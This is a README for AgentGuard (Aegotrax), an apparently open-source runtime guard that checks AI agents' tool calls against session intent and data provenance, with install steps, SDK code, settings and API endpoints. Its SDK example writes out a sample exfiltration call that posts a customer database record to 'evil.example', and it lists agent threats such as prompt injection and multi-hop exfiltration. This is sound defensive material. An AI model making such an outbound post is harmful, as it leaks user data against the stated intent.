# Aegotrax (runtime core)

Runtime protection for AI agents — checks tool calls before they run.

Public site: https://aegotrax.com

This repository contains the open pilot runtime (package name in code: `agentguard`).

---

# 🛡️ AgentGuard v0.2 — Pilot-Ready Runtime Security for AI Agents

Runtime protection for autonomous agents: **intercept tool calls**, evaluate **intent + data provenance**, and **block or require approval** before sensitive actions run.

Supports:
- **MCP Gateway** (stdio) for agent frameworks
- **Python SDK** for direct integration with your existing tools

---

## Install

```bash
pip install .
# with LangGraph demo deps:
pip install ".[demo]"
```

Commands after install:

```bash
agentguard-engine     # Risk Engine → http://127.0.0.1:8000
agentguard-gateway    # MCP Gateway (stdio)
```

Health check: `curl http://127.0.0.1:8000/health`

---

## Pilot integration (SDK — recommended)

```python
from agentguard import verify_tool_call, set_session_context, protected_tool

# 1) Register user intent for this session
set_session_context("sess-42", user_intent="Summarize the ticket only")

# 2) Before every tool call
result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="Summarize the ticket only",
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

# 3) Or decorate your real functions
@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "Summarize the ticket only",
)
def send_email(to: str, body: str):
    ...
```

---

## Configuration (environment)

| Variable | Default | Purpose |
|----------|---------|---------|
| `AGENTGUARD_API_KEY` | — | If set, required as `X-API-Key` on engine APIs |
| `AGENTGUARD_POLICY_PATH` | package policy | Custom `policy.yaml` |
| `AGENTGUARD_AUDIT_LOG` | `agentguard_audit.log` | Audit file path |
| `AGENTGUARD_MODE` | `simulate` | Gateway: `simulate` / `echo` / `forward` |
| `AGENTGUARD_FAIL_CLOSED` | `true` | Block when engine unreachable |
| `AGENTGUARD_APPROVAL_WEBHOOK` | — | POST events when `REQUIRE_APPROVAL` |
| `AGENTGUARD_HOST` / `PORT` | `127.0.0.1` / `8000` | Engine bind |

Policy override order: `AGENTGUARD_POLICY_PATH` → `./policy.yaml` → package default.

---

## Engine API (pilot)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Liveness |
| POST | `/verify-multi-agent` | Main decision API |
| POST | `/session` | Set session intent |
| POST | `/session/reset` | Clear session provenance |
| GET | `/session/{id}` | Inspect session |
| POST | `/policy/reload` | Reload policy without restart |

---

## Threats covered

- Indirect prompt injection leading to tool abuse  
- Data provenance / multi-hop exfiltration  
- Intent constraint violations (“summarize only” → outbound)  
- Dangerous script execution  

---

## License

MIT
